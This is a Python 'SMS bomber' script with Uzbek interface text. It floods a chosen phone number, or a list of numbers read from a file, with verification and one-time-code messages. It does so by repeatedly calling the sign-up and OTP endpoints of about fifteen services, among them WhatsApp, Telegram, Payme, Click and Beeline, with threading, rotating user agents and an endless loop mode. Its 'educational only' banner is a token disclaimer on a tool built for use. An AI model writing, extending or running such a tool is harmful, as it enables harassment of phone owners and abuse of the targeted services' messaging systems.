#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🇺🇿 SUPER SMS BOMBER V4.0 – OʻZBEKISTON XIZMATLARI UCHUN
# ⚠️ FAQAT TAʼLIMIY MAQSADDA!

import sys
import os
import time
import re
import random
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print("⚠️ 'requests' kutubxonasi topilmadi. Oʻrnatilmoqda...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

# ----------------------- RANGLAR ----------------------------
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
C = Colors()

# ----------------------- KONFIGURATSIYA --------------------
CONFIG = {
    'timeout': 10,
    'max_workers': 10,
    'user_agents': [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ],
    'log_file': 'spam.log',
    'stats_file': 'stats.json'
}

# ----------------------- LOGGER ----------------------------
class Logger:
    def __init__(self):
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.lock = threading.Lock()
    def log(self, msg, level='INFO'):
        with self.lock:
            ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
                f.write(f'[{ts}] [{level}] {msg}\n')
    def update(self, ok):
        with self.lock:
            self.stats['total'] += 1
            if ok:
                self.stats['success'] += 1
            else:
                self.stats['failed'] += 1
            with open(CONFIG['stats_file'], 'w') as f:
                json.dump(self.stats, f, indent=2)
    def show(self):
        return f"Jami: {self.stats['total']}, OK: {self.stats['success']}, Fail: {self.stats['failed']}"
logger = Logger()

# ----------------------- SPAMMER SINFI ---------------------
class UzSpammer:
    def __init__(self, phone):
        self.phone = self._fmt(phone)
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(CONFIG['user_agents'])})
        self.session.timeout = CONFIG['timeout']

    def _fmt(self, p):
        p = re.sub(r'[^0-9+]', '', str(p))
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        if len(p) == 12 and p.isdigit():
            return f'+998{p[3:]}'
        return f'+998{p}'

    def _req(self, url, method='POST', data=None, json_data=None, headers=None):
        try:
            if headers:
                self.session.headers.update(headers)
            if method.upper() == 'POST':
                if json_data:
                    r = self.session.post(url, json=json_data)
                else:
                    r = self.session.post(url, data=data)
            else:
                r = self.session.get(url)
            return r
        except:
            return None

    # ---------- XIZMATLAR ----------
    def whatsapp(self):
        try:
            r = self._req('https://web.whatsapp.com/register', data={'phone_number': self.phone[1:]})
            if r and r.status_code in (200, 302):
                logger.update(True); return f"{C.GREEN}✅ WhatsApp"
            logger.update(False); return f"{C.RED}❌ WhatsApp"
        except:
            logger.update(False); return f"{C.RED}❌ WhatsApp"

    def whatsapp_business(self):
        try:
            r = self._req('https://business.whatsapp.com/register', data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ WhatsApp Business"
            logger.update(False); return f"{C.RED}❌ WhatsApp Business"
        except:
            logger.update(False); return f"{C.RED}❌ WhatsApp Business"

    def telegram(self):
        try:
            r = self._req('https://my.telegram.org/auth/send_password', data={'phone': self.phone[1:]})
            if r and 'sent' in r.text.lower():
                logger.update(True); return f"{C.GREEN}✅ Telegram"
            logger.update(False); return f"{C.RED}❌ Telegram"
        except:
            logger.update(False); return f"{C.RED}❌ Telegram"

    def telegram_app(self):
        try:
            r = self._req('https://core.telegram.org/register', data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ Telegram App"
            logger.update(False); return f"{C.RED}❌ Telegram App"
        except:
            logger.update(False); return f"{C.RED}❌ Telegram App"

    def uzum(self):
        try:
            r = self._req('https://api.uzum.uz/api/v1/auth/send-sms-code',
                          json_data={'phone': self.phone, 'type': 'register'})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ UZUM"
            logger.update(False); return f"{C.RED}❌ UZUM"
        except:
            logger.update(False); return f"{C.RED}❌ UZUM"

    def olx(self):
        try:
            r = self._req('https://www.olx.uz/api/v1/auth/request-otp/',
                          json_data={'phone': self.phone, 'lang': 'uz'})
            if r and 'otp' in r.text.lower():
                logger.update(True); return f"{C.GREEN}✅ OLX"
            logger.update(False); return f"{C.RED}❌ OLX"
        except:
            logger.update(False); return f"{C.RED}❌ OLX"

    def click(self):
        try:
            r = self._req('https://api.click.uz/api/v2/auth/send-code',
                          json_data={'phone': self.phone, 'service_id': '1'})
            if r and r.status_code in (200, 201):
                logger.update(True); return f"{C.GREEN}✅ CLICK"
            logger.update(False); return f"{C.RED}❌ CLICK"
        except:
            logger.update(False); return f"{C.RED}❌ CLICK"

    def payme(self):
        try:
            r = self._req('https://api.payme.uz/v1/auth/send-verification',
                          json_data={'phone_number': self.phone})
            if r and 'success' in r.text.lower():
                logger.update(True); return f"{C.GREEN}✅ PAYME"
            logger.update(False); return f"{C.RED}❌ PAYME"
        except:
            logger.update(False); return f"{C.RED}❌ PAYME"

    def apelsin(self):
        try:
            r = self._req('https://api.apelsin.uz/v1/oauth/sms',
                          json_data={'msisdn': self.phone, 'action': 'login'})
            if r and 'code' in r.text.lower():
                logger.update(True); return f"{C.GREEN}✅ APELSIN"
            logger.update(False); return f"{C.RED}❌ APELSIN"
        except:
            logger.update(False); return f"{C.RED}❌ APELSIN"

    def beeline(self):
        try:
            r = self._req('https://api.beeline.uz/v1/auth/send-sms',
                          json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ BEELINE"
            logger.update(False); return f"{C.RED}❌ BEELINE"
        except:
            logger.update(False); return f"{C.RED}❌ BEELINE"

    def zoodmall(self):
        try:
            r = self._req('https://api.zoodmall.uz/v1/auth/send-sms',
                          json_data={'phone': self.phone})
            if r and 'otp' in r.text.lower():
                logger.update(True); return f"{C.GREEN}✅ ZOODMALL"
            logger.update(False); return f"{C.RED}❌ ZOODMALL"
        except:
            logger.update(False); return f"{C.RED}❌ ZOODMALL"

    def tashxis(self):
        try:
            r = self._req('https://api.tashxis.uz/v1/auth/send-code',
                          json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ TASHXIS"
            logger.update(False); return f"{C.RED}❌ TASHXIS"
        except:
            logger.update(False); return f"{C.RED}❌ TASHXIS"

    def pochta(self):
        try:
            r = self._req('https://api.pochta.uz/v1/auth/send-otp',
                          json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ POCHTA"
            logger.update(False); return f"{C.RED}❌ POCHTA"
        except:
            logger.update(False); return f"{C.RED}❌ POCHTA"

    def imei(self):
        try:
            r = self._req('https://api.imei.uz/v1/auth/send-code',
                          json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ IMEI"
            logger.update(False); return f"{C.RED}❌ IMEI"
        except:
            logger.update(False); return f"{C.RED}❌ IMEI"

    def one_c(self):
        try:
            r = self._req('https://1c.uz/auth/send-sms',
                          json_data={'phone': self.phone})
            if r and r.status_code == 200:
                logger.update(True); return f"{C.GREEN}✅ 1C"
            logger.update(False); return f"{C.RED}❌ 1C"
        except:
            logger.update(False); return f"{C.RED}❌ 1C"

    def all_services(self):
        services = [
            self.whatsapp, self.whatsapp_business,
            self.telegram, self.telegram_app,
            self.uzum, self.olx, self.click, self.payme,
            self.apelsin, self.beeline, self.zoodmall,
            self.tashxis, self.pochta, self.imei, self.one_c
        ]
        results = []
        with ThreadPoolExecutor(max_workers=CONFIG['max_workers']) as ex:
            futures = [ex.submit(s) for s in services]
            for f in futures:
                results.append(f.result())
                time.sleep(0.2)
        return results

# ----------------------- INTERFEYS --------------------------
def clear():
    os.system('clear')

def banner():
    print(f"""
{C.BOLD}{C.CYAN}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║      🇺🇿  SUPER SMS BOMBER V4.0  🇺🇿                     ║
║      OʻZBEKISTON XIZMATLARI UCHUN                        ║
║                                                           ║
║      {C.RED}⚠️  FAQAT TAʼLIMIY MAQSADDA!  ⚠️              ║
║      {C.RED}⚠️  NOQONUNIY FOYDALANISH UCHUN JAVOBGARLIK SIZDA! ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{C.END}""")

def menu():
    print(f"""
{C.YELLOW}┌─────────────────────────────────────────────────────────┐
│ {C.CYAN}1{C.YELLOW}. Bitta raqamga spam                              │
│ {C.CYAN}2{C.YELLOW}. Koʻp raqamlarga spam                           │
│ {C.CYAN}3{C.YELLOW}. Fayldan spam                                  │
│ {C.CYAN}4{C.YELLOW}. Avtomatik rejim (cheksiz)                     │
│ {C.CYAN}5{C.YELLOW}. Statistikani koʻrish                          │
│ {C.CYAN}0{C.YELLOW}. Chiqish                                       │
└─────────────────────────────────────────────────────────┘
{C.END}""")

def get_phone():
    while True:
        p = input(f"{C.BLUE}📱 Raqam (+998...): {C.END}").strip()
        p = re.sub(r'[^0-9+]', '', p)
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        print(f"{C.RED}❌ Notoʻgʻri format! Masalan: +998901234567{C.END}")

def single_mode():
    clear(); banner()
    phone = get_phone()
    count = int(input(f"{C.BLUE}🔢 Necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi urinish ━━━{C.END}")
        sp = UzSpammer(phone)
        for res in sp.all_services():
            print(f"  {res}")
        print(f"{C.BLUE}📊 {logger.show()}{C.END}\n")
        time.sleep(delay)
    print(f"{C.GREEN}✅ Tugadi! {count} marta yuborildi.{C.END}")

def multi_mode():
    clear(); banner()
    phones = []
    n = int(input(f"{C.BLUE}👥 Nechta raqam: {C.END}"))
    for i in range(n):
        print(f"{C.YELLOW}Raqam {i+1}:{C.END}")
        phones.append(get_phone())
    count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
        for phone in phones:
            print(f"{C.CYAN}📱 {phone}{C.END}")
            sp = UzSpammer(phone)
            for res in sp.all_services():
                print(f"  {res}")
            print()
            time.sleep(delay/2)
        time.sleep(delay/2)
    print(f"{C.GREEN}✅ Tugadi!{C.END}")

def file_mode():
    clear(); banner()
    fname = input(f"{C.BLUE}📂 Fayl nomi: {C.END}")
    try:
        with open(fname, 'r') as f:
            phones = [line.strip() for line in f if line.strip()]
        if not phones:
            print(f"{C.RED}❌ Faylda raqamlar yoʻq!{C.END}"); return
        print(f"{C.GREEN}✅ {len(phones)} ta raqam topildi{C.END}")
        count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
        delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
        print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
        for i in range(count):
            print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
            for phone in phones:
                print(f"{C.CYAN}📱 {phone}{C.END}")
                sp = UzSpammer(phone)
                for res in sp.all_services():
                    print(f"  {res}")
                print()
                time.sleep(delay/2)
            time.sleep(delay/2)
        print(f"{C.GREEN}✅ Tugadi!{C.END}")
    except FileNotFoundError:
        print(f"{C.RED}❌ Fayl topilmadi: {fname}{C.END}")

def auto_mode():
    clear(); banner()
    phone = get_phone()
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    print(f"\n{C.RED}⚠️ Avtomatik rejim. Toʻxtatish CTRL+C{C.END}\n")
    count = 0
    try:
        while True:
            count += 1
            print(f"{C.YELLOW}━━━ {count}-chi urinish ━━━{C.END}")
            sp = UzSpammer(phone)
            for res in sp.all_services():
                print(f"  {res}")
            print(f"{C.BLUE}⏱️ {datetime.now().strftime('%H:%M:%S')} | {logger.show()}{C.END}\n")
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}✅ Toʻxtatildi! Jami {count} marta.{C.END}")

def show_stats():
    clear(); banner()
    print(f"{C.CYAN}📊 STATISTIKA{C.END}")
    print(f"{C.YELLOW}{logger.show()}{C.END}")
    try:
        with open(CONFIG['log_file'], 'r') as f:
            lines = f.readlines()
            print(f"\n{C.CYAN}📄 Oxirgi 10 ta log:{C.END}")
            for line in lines[-10:]:
                print(f"  {line.strip()}")
    except:
        print(f"{C.RED}❌ Log fayli topilmadi.{C.END}")
    input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

def main():
    while True:
        clear(); banner(); menu()
        choice = input(f"{C.BLUE}📌 Tanlang [0-5]: {C.END}")
        if choice == '1': single_mode()
        elif choice == '2': multi_mode()
        elif choice == '3': file_mode()
        elif choice == '4': auto_mode()
        elif choice == '5': show_stats()
        elif choice == '0':
            print(f"\n{C.GREEN}👋 Xayr!{C.END}"); sys.exit(0)
        else:
            print(f"{C.RED}❌ Notoʻgʻri!{C.END}"); time.sleep(1)
        input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}👋 Xayr!{C.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{C.RED}❌ Xatolik: {e}{C.END}")
        sys.exit(1)